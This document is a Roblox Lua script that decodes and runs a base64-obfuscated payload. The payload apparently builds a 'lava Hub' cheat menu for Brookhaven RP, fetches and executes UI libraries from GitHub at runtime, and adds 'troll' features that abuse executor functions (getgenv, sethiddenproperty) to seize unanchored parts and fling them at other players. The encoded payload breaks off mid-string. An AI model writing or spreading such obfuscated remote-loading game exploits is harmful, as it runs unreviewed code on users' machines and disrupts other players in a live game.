loadstring((function(b64) local chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'; local result = ''; local val = 0; local valb = -8; for i = 1, #b64 do local c = b64:sub(i,i); if c ~= '=' then local pos = chars:find(c) - 1; val = val * 64 + pos; valb = valb + 6; if valb >= 0 then result = result .. string.char(math.floor(val / 2^valb) % 256); val = val % 2^valb; valb = valb - 8; end; end; end; return result; end)("bG9jYWwgTGliYXJ5ID0gbG9hZHN0cmluZyhnYW1lSHR0cEdldChodHRwc3Jhdy5naXRodWJ1c2VyY29udGVudC5jb210YmFvMTQzTGlicmFyeS11aXJlZnNoZWFkc21haW5SZWR6aHVidWkpKSgpCndvcmtzcGFjZS5GYWxsZW5QYXJ0c0Rlc3Ryb3lIZWlnaHQgPSAtbWF0aC5odWdlCgpsb2NhbCBXaW5kb3cgPSBMaWJhcnlNYWtlV2luZG93KHsKICAgIFRpdGxlID0gbGF2YSBIdWIgIEJyb29raGF2ZW4gUlAgLAogICAgU3ViVGl0bGUgPSBieSBAa24xZmFuICBsYXZhODVoYWxzdCwKICAgIExvYWRUZXh0ID0gTG9hZGluZyBsYXZhIEh1YiwKICAgIEZsYWdzID0gQ2hhb3NIdWJfQnJvb29raGF2ZW4KfSkKV2luZG93QWRkTWluaW1pemVCdXR0b24oewogICAgQnV0dG9uID0geyBJbWFnZSA9IHJieGFzc2V0aWQ3MjY3NDA2ODczNjY5NSwgQmFja2dyb3VuZFRyYW5zcGFyZW5jeSA9IDAgfSwKICAgIENvcm5lciA9IHsgQ29ybmVyUmFkaXVzID0gVURpbS5uZXcoMzUsIDEpIH0sCn0pCgpsb2NhbCBJbmZvVGFiID0gV2luZG93TWFrZVRhYih7IFRpdGxlID0gSW5mbywgSWNvbiA9IHJieGFzc2V0aWQ3MjY3NDA2ODczNjY5NSB9KQoKCgpJbmZvVGFiQWRkU2VjdGlvbih7IFNjcmlwdCBJbmZvcm1hdGlvbiB9KQpJbmZvVGFiQWRkUGFyYWdyYXBoKHsgT3duZXIgIERldmVsb3BlciwgQGtuMWZhbiAgbGF2YTg1aGFsc3QgfSkKSW5mb1RhYkFkZFBhcmFncmFwaCh7IFlvdSBhcmUgdXNpbmcsIGxhdmEgSHViIEJyb29raGF2ZW4gIH0pCkluZm9UYWJBZGRQYXJhZ3JhcGgoe1lvdXIgZXhlY3V0b3IsIGV4ZWN1dG9yfSkKCkluZm9UYWJBZGRTZWN0aW9uKHsgUmVqb2luIH0pCkluZm9UYWJBZGRCdXR0b24oewogICAgTmFtZSA9IFJlam9pbiwKICAgIENhbGxiYWNrID0gZnVuY3Rpb24oKQogICAgICAgIGxvY2FsIFRlbGVwb3J0U2VydmljZSA9IGdhbWVHZXRTZXJ2aWNlKFRlbGVwb3J0U2VydmljZSkKICAgICAgICBUZWxlcG9ydFNlcnZpY2VUZWxlcG9ydFRvUGxhY2VJbnN0YW5jZShnYW1lLlBsYWNlSWQsIGdhbWUuSm9iSWQsIGdhbWUuUGxheWVycy5Mb2NhbFBsYXllcikKICAgIGVuZAp9KQoKCgpsb2NhbCBUcm9sbFRhYiA9IFdpbmRvd01ha2VUYWIoeyBUaXRsZSA9IFRyb2xsIFNjcmlwdHMsIEljb24gPSByYnhhc3NldGlkMTMzNjQ5MDAzNDkgfSkKCgpUcm9sbFRhYkFkZFNlY3Rpb24oeyBCbGFjayBIb2xlIH0pClRyb2xsVGFiQWRkQnV0dG9uKHsKICAgIE5hbWUgPSBCbGFjayBIb2xlLAogICAgRGVzY3JpcHRpb24gPSBBY3RpdmF0aW5nIHRoaXMgd2lsbCBwdWxsIHBhcnRzIHRvd2FyZHMgeW91ciBjaGFyYWN0ZXIsCiAgICBDYWxsYmFjayA9IGZ1bmN0aW9uKCkKICAgICAgICBsb2NhbCBQbGF5ZXJzID0gZ2FtZUdldFNlcnZpY2UoUGxheWVycykKbG9jYWwgUnVuU2VydmljZSA9IGdhbWVHZXRTZXJ2aWNlKFJ1blNlcnZpY2UpCmxvY2FsIExvY2FsUGxheWVyID0gUGxheWVycy5Mb2NhbFBsYXllcgpsb2NhbCBXb3Jrc3BhY2UgPSBnYW1lR2V0U2VydmljZShXb3Jrc3BhY2UpCgpsb2NhbCBhbmdsZSA9IDEKbG9jYWwgcmFkaXVzID0gMTAKbG9jYWwgYmxhY2tIb2xlQWN0aXZlID0gZmFsc2UKCmxvY2FsIGZ1bmN0aW9uIHNldHVwUGxheWVyKCkKICAgIGxvY2FsIGNoYXJhY3RlciA9IExvY2FsUGxheWVyLkNoYXJhY3RlciBvciBMb2NhbFBsYXllci5DaGFyYWN0ZXJBZGRlZFdhaXQoKQogICAgbG9jYWwgaHVtYW5vaWRSb290UGFydCA9IGNoYXJhY3RlcldhaXRGb3JDaGlsZChIdW1hbm9pZFJvb3RQYXJ0KQoKICAgIGxvY2FsIEZvbGRlciA9IEluc3RhbmNlLm5ldyhGb2xkZXIsIFdvcmtzcGFjZSkKICAgIGxvY2FsIFBhcnQgPSBJbnN0YW5jZS5uZXcoUGFydCwgRm9sZGVyKQogICAgbG9jYWwgQXR0YWNobWVudDEgPSBJbnN0YW5jZS5uZXcoQXR0YWNobWVudCwgUGFydCkKICAgIFBhcnQuQW5jaG9yZWQgPSB0cnVlCiAgICBQYXJ0LkNhbkNvbGxpZGUgPSBmYWxzZQogICAgUGFydC5UcmFuc3BhcmVuY3kgPSAxCgogICAgcmV0dXJuIGh1bWFub2lkUm9vdFBhcnQsIEF0dGFjaG1lbnQxCmVuZAoKbG9jYWwgaHVtYW5vaWRSb290UGFydCwgQXR0YWNobWVudDEgPSBzZXR1cFBsYXllcigpCgppZiBub3QgZ2V0Z2VudigpLk5ldHdvcmsgdGhlbgogICAgZ2V0Z2VudigpLk5ldHdvcmsgPSB7CiAgICAgICAgQmFzZVBhcnRzID0ge30sCiAgICAgICAgVmVsb2NpdHkgPSBWZWN0b3IzLm5ldygxNC40NjI2MjQyNCwgMTQuNDYyNjI0MjQsIDE0LjQ2MjYyNDI0KQogICAgfQoKICAgIE5ldHdvcmsuUmV0YWluUGFydCA9IGZ1bmN0aW9uKHBhcnQpCiAgICAgICAgaWYgdHlwZW9mKHBhcnQpID09IEluc3RhbmNlIGFuZCBwYXJ0SXNBKEJhc2VQYXJ0KSBhbmQgcGFydElzRGVzY2VuZGFudE9mKFdvcmtzcGFjZSkgdGhlbgogICAgICAgICAgICB0YWJsZS5pbnNlcnQoTmV0d29yay5CYXNlUGFydHMsIHBhcnQpCiAgICAgICAgICAgIHBhcnQuQ3VzdG9tUGh5c2ljYWxQcm9wZXJ0aWVzID0gUGh5c2ljYWxQcm9wZXJ0aWVzLm5ldygwLCAwLCAwLCAwLCAwKQogICAgICAgICAgICBwYXJ0LkNhbkNvbGxpZGUgPSBmYWxzZQogICAgICAgIGVuZAogICAgZW5kCgogICAgbG9jYWwgZnVuY3Rpb24gRW5hYmxlUGFydENvbnRyb2woKQogICAgICAgIExvY2FsUGxheWVyLlJlcGxpY2F0aW9uRm9jdXMgPSBXb3Jrc3BhY2UKICAgICAgICBSdW5TZXJ2aWNlLkhlYXJ0YmVhdENvbm5lY3QoZnVuY3Rpb24oKQogICAgICAgICAgICBzZXRoaWRkZW5wcm9wZXJ0eShMb2NhbFBsYXllciwgU2ltdWxhdGlvblJhZGl1cywgbWF0aC5odWdlKQogICAgICAgICAgICBmb3IgXywgcGFydCBpbiBwYWlycyhOZXR3b3JrLkJhc2VQYXJ0cykgZG8KICAgICAgICAgICAgICAgIGlmIHBhcnRJc0Rlc2NlbmRhbnRPZihXb3Jrc3BhY2UpIHRoZW4KICAgICAgICAgICAgICAgICAgICBwYXJ0LlZlbG9jaXR5ID0gTmV0d29yay5WZWxvY2l0eQogICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgIGVuZAogICAgICAgIGVuZCkKICAgIGVuZAoKICAgIEVuYWJsZVBhcnRDb250cm9sKCkKZW5kCgpsb2NhbCBmdW5jdGlvbiBGb3JjZVBhcnQodikKICAgIGlmIHZJc0EoUGFydCkgYW5kIG5vdCB2LkFuY2hvcmVkIGFuZCBub3Qgdi5QYXJlbnRGaW5kRmlyc3RDaGlsZChIdW1hbm9pZCkgYW5kIG5vdCB2LlBhcmVudEZpbmRGaXJzdENoaWxkKEhlYWQpIGFuZCB2Lk5hbWUgfj0gSGFuZGxlIHRoZW4KICAgICAgICBmb3IgXywgeCBpbiBuZXh0LCB2R2V0Q2hpbGRyZW4oKSBkbwogICAgICAgICAgICBpZiB4SXNBKEJvZHlBbmd1bGFyVmVsb2NpdHkpIG9yIHhJc0EoQm9keUZvcmNlKSBvciB4SXNBKEJvZHlHeXJvKSBvciB4SXNBKEJvZHlQb3NpdGlvbikgb3IgeElzQShCb2R5VGhydXN0KSBvciB4SXNBKEJvZHlWZWxvY2l0eSkgb3IgeElzQShSb2NrZXRQcm9wdWxzaW9uKSB0aGVuCiAgICAgICAgICAgICAgICB4RGVzdHJveSgpCiAgICAgICAgICAgIGVuZAogICAgICAgIGVuZAogICAgICAgIGlmIHZGaW5kRmlyc3RDaGlsZChBdHRhY2htZW50KSB0aGVuCiAgICAgICAgICAgIHZGaW5kRmlyc3RDaGlsZChBdHRhY2htZW50KURlc3Ryb3koKQogICAgICAgIGVuZAogICAgICAgIGlmIHZGaW5kRmlyc3RDaGlsZChBbGlnblBvc2l0aW9uKSB0aGVuCiAgICAgICAgICAgIHZGaW5kRmlyc3RDaGlsZChBbGlnblBvc2l0aW9uKURlc3Ryb3koKQogICAgICAgIGVuZAogICAgICAgIGlmIHZGaW5kRmlyc3RDaGlsZChUb3JxdWUpIHRoZW4KICAgICAgICAgICAgdkZpbmRGaXJzdENoaWxkKFRvcnF1ZSlEZXN0cm95KCkKICAgICAgICBlbmQKICAgICAgICB2LkNhbkNvbGxpZGUgPSBmYWxzZQogICAgICAgIAogICAgICAgIGxvY2FsIFRvcnF1ZSA9IEluc3RhbmNlLm5ldyhUb3JxdWUsIHYpCiAgICAgICAgVG9ycXVlLlRvcnF1ZSA9IFZlY3RvcjMubmV3KDEwMDAwMDAsIDEwMDAwMDAsIDEwMDAwMDApCiAgICAgICAgbG9jYWwgQWxpZ25Qb3NpdGlvbiA9IEluc3RhbmNlLm5ldyhBbGlnblBvc2l0aW9uLCB2KQogICAgICAgIGxvY2FsIEF0dGFjaG1lbnQyID0gSW5zdGFuY2UubmV3KEF0dGFjaG1lbnQsIHYpCiAgICAgICAgVG9ycXVlLkF0dGFjaG1lbnQwID0gQXR0YWNobWVudDIKICAgICAgICBBbGlnblBvc2l0aW9uLk1heEZvcmNlID0gbWF0aC5odWdlCiAgICAgICAgQWxpZ25Qb3NpdGlvbi5NYXhWZWxvY2l0eSA9IG1hdGguaHVnZQogICAgICAgIEFsaWduUG9zaXRpb24uUmVzcG9uc2l2ZW5lc3MgPSA1MDAKICAgICAgICBBbGlnblBvc2l0aW9uLkF0dGFjaG1lbnQwID0gQXR0YWNobWVudDIKICAgICAgICBBbGlnblBvc2l0aW9uLkF0dGFjaG1lbnQxID0gQXR0YWNobWVudDEKICAgIGVuZAplbmQKCmxvY2FsIGZ1bmN0aW9uIHRvZ2dsZUJsYWNrSG9sZSgpCiAgICBibGFja0hvbGVBY3RpdmUgPSBub3QgYmxhY2tIb2xlQWN0aXZlCiAgICBpZiBibGFja0hvbGVBY3RpdmUgdGhlbgogICAgICAgIGZvciBfLCB2IGluIG5leHQsIFdvcmtzcGFjZUdldERlc2NlbmRhbnRzKCkgZG8KICAgICAgICAgICAgRm9yY2VQYXJ0KHYpCiAgICAgICAgZW5kCgogICAgICAgIFdvcmtzcGFjZS5EZXNjZW5kYW50QWRkZWRDb25uZWN0KGZ1bmN0aW9uKHYpCiAgICAgICAgICAgIGlmIGJsYWNrSG9sZUFjdGl2ZSB0aGVuCiAgICAgICAgICAgICAgICBGb3JjZVBhcnQodikKICAgICAgICAgICAgZW5kCiAgICAgICAgZW5kKQoKICAgICAgICBzcGF3bihmdW5jdGlvbigpCiAgICAgICAgICAgIHdoaWxlIGJsYWNrSG9sZUFjdGl2ZSBhbmQgUnVuU2VydmljZS5SZW5kZXJTdGVwcGVkV2FpdCgpIGRvCiAgICAgICAgICAgICAgICBhbmdsZSA9IGFuZ2xlICsgbWF0aC5yYWQoMikKCiAgICAgICAgICAgICAgICBsb2NhbCBvZmZzZXRYID0gbWF0aC5jb3MoYW5nbGUpICByYWRpdXMKICAgICAgICAgICAgICAgIGxvY2FsIG9mZnNldFogPSBtYXRoLnNpbihhbmdsZSkgIHJhZGl1cwoKICAgICAgICAgICAgICAgIEF0dGFjaG1lbnQxLldvcmxkQ0ZyYW1lID0gaHVtYW5vaWRSb290UGFydC5DRnJhbWUgIENGcmFtZS5uZXcob2Zmc2V0WCwgMCwgb2Zmc2V0WikKICAgICAgICAgICAgZW5kCiAgICAgICAgZW5kKQogICAgZWxzZQogICAgICAgIEF0dGFjaG1lbnQxLldvcmxkQ0ZyYW1lID0gQ0ZyYW1lLm5ldygwLCAtMTAwMCwgMCkKICAgIGVuZAplbmQKCkxvY2FsUGxheWVyLkNoYXJhY3RlckFkZGVkQ29ubmVjdChmdW5jdGlvbigpCiAgICBodW1hbm9pZFJvb3RQYXJ0LCBBdHRhY2htZW50MSA9IHNldHVwUGxheWVyKCkKICAgIGlmIGJsYWNrSG9sZUFjdGl2ZSB0aGVuCiAgICAgICAgdG9nZ2xlQmxhY2tIb2xlKCkgLS0gUmUtdG9nZ2xlIHRvIGFwcGx5IHRvIG5ldyBjaGFyYWN0ZXIKICAgIGVuZAplbmQpCgpsb2NhbCBsaWJyYXJ5ID0gbG9hZHN0cmluZyhnYW1lSHR0cEdldChodHRwc3Jhdy5naXRodWJ1c2VyY29udGVudC5jb21taXJvZXJhbWFhVHVydGxlTGlibWFpblR1cnRsZVVpTGliLmx1YSkpKCkKbG9jYWwgd2luZG93ID0gbGlicmFyeVdpbmRvdyhQcm9qZWN0IExLQikKCndpbmRvd1NsaWRlcihCbGFja2hvbGUgUmFkaXVzLDEsMTAwLDEwLCBmdW5jdGlvbihWYWx1ZSkKICAgcmFkaXVzID0gVmFsdWUKZW5kKQoKd2luZG93VG9nZ2xlKEJsYWNraG9sZSwgdHJ1ZSwgZnVuY3Rpb24oVmFsdWUpCiAgICAgICBpZiBWYWx1ZSB0aGVuCiAgICAgICAgICAgIHRvZ2dsZUJsYWNrSG9sZSgpCiAgICAgICAgZWxzZQogICAgICAgICAgICBibGFja0hvbGVBY3RpdmUgPSBmYWxzZQogICAgICAgIGVuZAplbmQpCgpzcGF3bihmdW5jdGlvbigpCiAgICB3aGlsZSB0cnVlIGRvCiAgICAgICAgUnVuU2VydmljZS5SZW5kZXJTdGVwcGVkV2FpdCgpCiAgICAgICAgaWYgYmxhY2tIb2xlQWN0aXZlIHRoZW4KICAgICAgICAgICAgYW5nbGUgPSBhbmdsZSArIG1hdGgucmFkKGFuZ2xlU3BlZWQpCiAgICAgICAgZW5kCiAgICBlbmQKZW5kKQoKdG9nZ2xlQmxhY2tIb2xlKCkKICAgIGVuZAp9KQoKClRyb2xsVGFiQWRkU2VjdGlvbih7IFB1bGwgUGFydHMgfSkKVHJvbGxUYWJBZGRCdXR0b24oewogICAgTmFtZSA9IFB1bGwgUGFydHMsCiAgICBEZXNjcmlwdGlvbiA9IFRvIHVzZSwgZ2V0IGNsb3NlIHRvIHRoZSBzZWxlY3RlZCBwbGF5ZXIsCiAgICBDYWxsYmFjayA9IGZ1bmN0aW9uKCkKICAgICAgICAtLSBHdWkgdG8gTHVhCi0tIFZlcnNpb24gMy4yCgotLSBJbnN0YW5jZXMKCmxvY2FsIEd1aSA9IEluc3RhbmNlLm5ldyhTY3JlZW5HdWkpCmxvY2FsIE1haW4gPSBJbnN0YW5jZS5uZXcoRnJhbWUpCmxvY2FsIEJveCA9IEluc3RhbmNlLm5ldyhUZXh0Qm94KQpsb2NhbCBVSVRleHRTaXplQ29uc3RyYWludCA9IEluc3RhbmNlLm5ldyhVSVRleHRTaXplQ29uc3RyYWludCkKbG9jYWwgTGFiZWwgPSBJbnN0YW5jZS5uZXcoVGV4dExhYmVsKQpsb2NhbCBVSVRleHRTaXplQ29uc3RyYWludF8yID0gSW5zdGFuY2UubmV3KFVJVGV4dFNpemVDb25zdHJhaW50KQpsb2NhbCBCdXR0b24gPSBJbnN0YW5jZS5uZXcoVGV4dEJ1dHRvbikKbG9jYWwgVUlUZXh0U2l6ZUNvbnN0cmFpbnRfMyA9IEluc3RhbmNlLm5ldyhVSVRleHRTaXplQ29uc3RyYWludCkKCi0tUHJvcGVydGllcwoKR3VpLk5hbWUgPSBQdWxsUGFydHNHVUkKR3VpLlBhcmVudCA9IGdldGh1aSgpCkd1aS5aSW5kZXhCZWhhdmlvciA9IEVudW0uWkluZGV4QmVoYXZpb3IuU2libGluZwoKTWFpbi5OYW1lID0gTWFpbkZyYW1lCk1haW4uUGFyZW50ID0gR3VpCk1haW4uQmFja2dyb3VuZENvbG9yMyA9IENvbG9yMy5mcm9tUkdCKDc1LCA3NSwgNzUpCk1haW4uQm9yZGVyQ29sb3IzID0gQ29sb3IzLmZyb21SR0IoMCwgMCwgMCkKTWFpbi5Cb3JkZXJTaXplUGl4ZWwgPSAwCk1haW4uUG9zaXRpb24gPSBVRGltMi5uZXcoMC4zMzU5NTQyNzksIDAsIDAuNTQyMzYxOTc1LCAwKQpNYWluLlNpemUgPSBVRGltMi5uZXcoMC4yNDAzNTAyNjEsIDAsIDAuMTY2ODgwNjIzLCAwKQpNYWluLkFjdGl2ZSA9IHRydWUKTWFpbi5EcmFnZ2FibGUgPSB0cnVlCgpCb3guTmFtZSA9IEJveApCb3guUGFyZW50ID0gTWFpbgpCb3guQmFja2dyb3VuZENvbG9yMyA9IENvbG9yMy5mcm9tUkdCKDk1LCA5NSwgOTUpCkJveC5Cb3JkZXJDb2xvcjMgPSBDb2xvcjMuZnJvbVJHQigwLCAwLCAwKQpCb3guQm9yZGVyU2l6ZVBpeGVsID0gMApCb3guUG9zaXRpb24gPSBVRGltMi5uZXcoMC4wOTgwOTI2NDU0LCAwLCAwLjIxODcxMjU4MywgMCkKQm94LlNpemUgPSBVRGltMi5uZXcoMC44MDEwODk5NDIsIDAsIDAuMzY0OTYzNTAyLCAwKQpCb3guRm9udEZhY2UgPSBGb250Lm5ldyhyYnhhc3NldGZvbnRzZmFtaWxpZXNTb3VyY2VTYW5zU2VtaWJvbGQuanNvbiwgRW51bS5Gb250V2VpZ2h0LkJvbGQsIEVudW0uRm9udFN0eWxlLk5vcm1hbCkKQm94LlBsYWNlaG9sZGVyVGV4dCA9IFBsYXllciBoZXJlCkJveC5UZXh0ID0gCkJveC5UZXh0Q29sb3IzID0gQ29sb3IzLmZyb21SR0IoMjU1LCAyNTUsIDI1NSkKQm94LlRleHRTY2FsZWQgPSB0cnVlCkJveC5UZXh0U2l6ZSA9IDMxLjAwMApCb3guVGV4dFdyYXBwZWQgPSB0cnVlCgpVSVRleHRTaXplQ29uc3RyYWludC5QYXJlbnQgPSBCb3gKVUlUZXh0U2l6ZUNvbnN0cmFpbnQuTWF4VGV4dFNpemUgPSAzMQoKTGFiZWwuTmFtZSA9IExhYmVsCkxhYmVsLlBhcmVudCA9IE1haW4KTGFiZWwuQmFja2dyb3VuZENvbG9yMyA9IENvbG9yMy5mcm9tUkdCKDk1LCA5NSwgOTUpCkxhYmVsLkJvcmRlckNvbG9yMyA9IENvbG9yMy5mcm9tUkdCKDAsIDAsIDApCkxhYmVsLkJvcmRlclNpemVQaXhlbCA9IDAKTGFiZWwuU2l6ZSA9IFVEaW0yLm5ldygxLCAwLCAwLjE2MDU4Mzk0MywgMCkKTGFiZWwuRm9udEZhY2UgPSBGb250Lm5ldyhyYnhhc3NldGZvbnRzZmFtaWxpZXNOdW5pdG8uanNvbiwgRW51bS5Gb250V2VpZ2h0LkJvbGQsIEVudW0uRm9udFN0eWxlLk5vcm1hbCkKTGFiZWwuVGV4dCA9IEJyaW5nIFBhcnRzICBNYWRlIGJ5IEx1c3F1aW5oYV8wNjcKTGFiZWwuVGV4dENvbG9yMyA9IENvbG9yMy5mcm9tUkdCKDI1NSwgMjU1LCAyNTUpCkxhYmVsLlRleHRTY2FsZWQgPSB0cnVlCkxhYmVsLlRleHRTaXplID0gMTQuMDAwCkxhYmVsLlRleHRXcmFwcGVkID0gdHJ1ZQoKVUlUZXh0U2l6ZUNvbnN0cmFpbnRfMi5QYXJlbnQgPSBMYWJlbApVSVRleHRTaXplQ29uc3RyYWludF8yLk1heFRleHRTaXplID0gMjEKCkJ1dHRvbi5OYW1lID0gQnV0dG9uCkJ1dHRvbi5QYXJlbnQgPSBNYWluCkJ1dHRvbi5CYWNrZ3JvdW5kQ29sb3IzID0gQ29sb3IzLmZyb21SR0IoOTUsIDk1LCA5NSkKQnV0dG9uLkJvcmRlckNvbG9yMyA9IENvbG9yMy5mcm9tUkdCKDAsIDAsIDApCkJ1dHRvbi5Cb3JkZXJTaXplUGl4ZWwgPSAwCkJ1dHRvbi5Qb3NpdGlvbiA9IFVEaW0yLm5ldygwLjE4MzI4NDQxNywgMCwgMC42NTY3NjA5OTEsIDApCkJ1dHRvbi5TaXplID0gVURpbTIubmV3KDAuNjI5NDI3NzkxLCAwLCAwLjI3NzM3MjI3MSwgMCkKQnV0dG9uLkZvbnQgPSBFbnVtLkZvbnQuTnVuaXRvCkJ1dHRvbi5UZXh0ID0gQnJpbmcgIE9mZgpCdXR0b24uVGV4dENvbG9yMyA9IENvbG9yMy5mcm9tUkdCKDI1NSwgMjU1LCAyNTUpCkJ1dHRvbi5UZXh0U2NhbGVkID0gdHJ1ZQpCdXR0b24uVGV4dFNpemUgPSAyOC4wMDAKQnV0dG9uLlRleHRXcmFwcGVkID0gdHJ1ZQoKVUlUZXh0U2l6ZUNvbnN0cmFpbnRfMy5QYXJlbnQgPSBCdXR0b24KVUlUZXh0U2l6ZUNvbnN0cmFpbnRfMy5NYXhUZXh0U2l6ZSA9IDI4CgotLSBTY3JpcHRzCgpsb2NhbCBQbGF5ZXJzID0gZ2FtZUdldFNlcnZpY2UoUGxheWVycykKbG9jYWwgUnVuU2VydmljZSA9IGdhbWVHZXRTZXJ2aWNlKFJ1blNlcnZpY2UpCmxvY2FsIExvY2FsUGxheWVyID0gUGxheWVycy5Mb2NhbFBsYXllcgpsb2NhbCBVc2VySW5wdXRTZXJ2aWNlID0gZ2FtZUdldFNlcnZpY2UoVXNlcklucHV0U2VydmljZSkKbG9jYWwgV29ya3NwYWNlID0gZ2FtZUdldFNlcnZpY2UoV29ya3NwYWNlKQoKbG9jYWwgY2hhcmFjdGVyCmxvY2FsIGh1bWFub2lkUm9vdFBhcnQKCm1haW5TdGF0dXMgPSB0cnVlClVzZXJJbnB1dFNlcnZpY2UuSW5wdXRCZWdhbkNvbm5lY3QoZnVuY3Rpb24oaW5wdXQsIGdhbWVQcm9jZXNzZWRFdmVudCkKCWlmIGlucHV0LktleUNvZGUgPT0gRW51bS5LZXlDb2RlLlJpZ2h0Q29udHJvbCBhbmQgbm90IGdhbWVQcm9jZXNzZWRFdmVudCB0aGVuCgkJbWFpblN0YXR1cyA9IG5vdCBtYWluU3RhdHVzCgkJTWFpbi5WaXNpYmxlID0gbWFpblN0YXR1cwoJZW5kCmVuZCkKCmxvY2FsIEZvbGRlciA9IEluc3RhbmNlLm5ldyhGb2xkZXIsIFdvcmtzcGFjZSkKbG9jYWwgUGFydCA9IEluc3RhbmNlLm5ldyhQYXJ0LCBGb2xkZXIpCmxvY2FsIEF0dGFjaG1lbnQxID0gSW5zdGFuY2UubmV3KEF0dGFjaG1lbnQsIFBhcnQpClBhcnQuQW5jaG9yZWQgPSB0cnVlClBhcnQuQ2FuQ29sbGlkZSA9IGZhbHNlClBhcnQuVHJhbnNwYXJlbmN5ID0gMQoKaWYgbm90IGdldGdlbnYoKS5OZXR3b3JrIHRoZW4KCWdldGdlbnYoKS5OZXR3b3JrID0gewoJCUJhc2VQYXJ0cyA9IHt9LAoJCVZlbG9jaXR5ID0gVmVjdG9yMy5uZXcoMTQuNDYyNjI0MjQsIDE0LjQ2MjYyNDI0LCAxNC40NjI2MjQyNCkKCX0KCglOZXR3b3JrLlJldGFpblBhcnQgPSBmdW5jdGlvbihQYXJ0KQoJCWlmIFBhcnRJc0EoQmFzZVBhcnQpIGFuZCBQYXJ0SXNEZXNjZW5kYW50T2YoV29ya3NwYWNlKSB0aGVuCgkJCXRhYmxlLmluc2VydChOZXR3b3JrLkJhc2VQYXJ0cywgUGFydCkKCQkJUGFydC5DdXN0b21QaHlzaWNhbFByb3BlcnRpZXMgPSBQaHlzaWNhbFByb3BlcnRpZXMubmV3KDAsIDAsIDAsIDAsIDApCgkJCVBhcnQuQ2FuQ29sbGlkZSA9IGZhbHNlCgkJZW5kCgllbmQKCglsb2NhbCBmdW5jdGlvbiBFbmFibGVQYXJ0Q29udHJvbCgpCgkJTG9jYWxQbGF5ZXIuUmVwbGljYXRpb25Gb2N1cyA9IFdvcmtzcGFjZQoJCVJ1blNlcnZpY2UuSGVhcnRiZWF0Q29ubmVjdChmdW5jdGlvbigpCgkJCXNldGhpZGRlbnByb3BlcnR5KExvY2FsUGxheWVyLCBTaW11bGF0aW9uUmFkaXVzLCBtYXRoLmh1Z2UpCgkJCWZvciBfLCBQYXJ0IGluIHBhaXJzKE5ldHdvcmsuQmFzZVBhcnRzKSBkbwoJCQkJaWYgUGFydElzRGVzY2VuZGFudE9mKFdvcmtzcGFjZSkgdGhlbgoJCQkJCVBhcnQuVmVsb2NpdHkgPSBOZXR3b3JrLlZlbG9jaXR5CgkJCQllbmQKCQkJZW5kCgkJZW5kKQoJZW5kCgoJRW5hYmxlUGFydENvbnRyb2woKQplbmQKCmxvY2FsIGZ1bmN0aW9uIEZvcmNlUGFydCh2KQoJaWYgdklzQShCYXNlUGFydCkgYW5kIG5vdCB2LkFuY2hvcmVkIGFuZCBub3Qgdi5QYXJlbnRGaW5kRmlyc3RDaGlsZE9mQ2xhc3MoSHVtYW5vaWQpIGFuZCBub3Qgdi5QYXJlbnRGaW5kRmlyc3RDaGlsZChIZWFkKSBhbmQgdi5OYW1lIH49IEhhbmRsZSB0aGVuCgkJZm9yIF8sIHggaW4gaXBhaXJzKHZHZXRDaGlsZHJlbigpKSBkbwoJCQlpZiB4SXNBKEJvZHlNb3Zlcikgb3IgeElzQShSb2NrZXRQcm9wdWxzaW9uKSB0aGVuCgkJCQl4RGVzdHJveSgpCgkJCWVuZAoJCWVuZAoJCWlmIHZGaW5kRmlyc3RDaGlsZChBdHRhY2htZW50KSB0aGVuCgkJCXZGaW5kRmlyc3RDaGlsZChBdHRhY2htZW50KURlc3Ryb3koKQoJCWVuZAoJCWlmIHZGaW5kRmlyc3RDaGlsZChBbGlnblBvc2l0aW9uKSB0aGVuCgkJCXZGaW5kRmlyc3RDaGlsZChBbGlnblBvc2l0aW9uKURlc3Ryb3koKQoJCWVuZAoJCWlmIHZGaW5kRmlyc3RDaGlsZChUb3JxdWUpIHRoZW4KCQkJdkZpbmRGaXJzdENoaWxkKFRvcnF1ZSlEZXN0cm95KCkKCQllbmQKCQl2LkNhbkNvbGxpZGUgPSBmYWxzZQoJCWxvY2FsIFRvcnF1ZSA9IEluc3RhbmNlLm5ldyhUb3JxdWUsIHYpCgkJVG9ycXVlLlRvcnF1ZSA9IFZlY3RvcjMubmV3KDEwMDAwMCwgMTAwMDAwLCAxMDAwMDApCgkJbG9jYWwgQWxpZ25Qb3NpdGlvbiA9IEluc3RhbmNlLm5ldyhBbGlnblBvc2l0aW9uLCB2KQoJCWxvY2FsIEF0dGFjaG1lbnQyID0gSW5zdGFuY2UubmV3KEF0dGFjaG1lbnQsIHYpCgkJVG9ycXVlLkF0dGFjaG1lbnQwID0gQXR0YWNobWVudDIKCQlBbGlnblBvc2l0aW9uLk1heEZvcmNlID0gbWF0aC5odWdlCgkJQWxpZ25Qb3NpdGlvbi5NYXhWZWxvY2l0eSA9IG1hdGguaHVnZQoJCUFsaWduUG9zaXRpb24uUmVzcG9uc2l2ZW5lc3MgPSAyMDAKCQlBbGlnblBvc2l0aW9uLkF0dGFjaG1lbnQwID0gQXR0YWNobWVudDIKCQlBbGlnblBvc2l0aW9uLkF0dGFjaG1lbnQxID0gQXR0YWNobWVudDEKCWVuZAplbmQKCmxvY2FsIGJsYWNrSG9sZUFjdGl2ZSA9IGZhbHNlCmxvY2FsIERlc2NlbmRhbnRBZGRlZENvbm5lY3Rpb24KCmxvY2FsIGZ1bmN0aW9uIHRvZ2dsZUJsYWNrSG9sZSgpCglibGFja0hvbGVBY3RpdmUgPSBub3QgYmxhY2tIb2xlQWN0aXZlCglpZiBibGFja0hvbGVBY3RpdmUgdGhlbgoJCUJ1dHRvbi5UZXh0ID0gQnJpbmcgUGFydHMgIE9uCgkJZm9yIF8sIHYgaW4gaXBhaXJzKFdvcmtzcGFjZUdldERlc2NlbmRhbnRzKCkpIGRvCgkJCUZvcmNlUGFydCh2KQoJCWVuZAoKCQlEZXNjZW5kYW50QWRkZWRDb25uZWN0aW9uID0gV29ya3NwYWNlLkRlc2NlbmRhbnRBZGRlZENvbm5lY3QoZnVuY3Rpb24odikKCQkJaWYgYmxhY2tIb2xlQWN0aXZlIHRoZW4KCQkJCUZvcmNlUGFydCh2KQoJCQllbmQKCQllbmQpCgoJCXNwYXduKGZ1bmN0aW9uKCkKCQkJd2hpbGUgYmxhY2tIb2xlQWN0aXZlIGFuZCBSdW5TZXJ2aWNlLlJlbmRlclN0ZXBwZWRXYWl0KCkgZG8KCQkJCUF0dGFjaG1lbnQxLldvcmxkQ0ZyYW1lID0gaHVtYW5vaWRSb29